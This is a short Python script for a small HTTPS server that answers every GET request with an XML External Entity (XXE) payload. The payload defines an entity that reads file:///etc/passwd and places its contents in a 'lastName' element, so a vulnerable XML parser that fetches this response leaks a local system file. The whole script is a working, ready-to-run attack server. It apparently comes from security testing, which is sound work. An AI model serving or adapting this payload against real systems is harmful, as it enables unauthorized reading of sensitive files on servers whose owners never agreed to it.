from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

payload = b"""<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
"""


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(payload)

httpd = HTTPServer(('0.0.0.0', 47200), SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket, 
        keyfile="/readonly/tadl/certificates/tadl.uber.space.key",
        certfile='/readonly/tadl/certificates/tadl.uber.space.crt', server_side=True)

httpd.serve_forever()

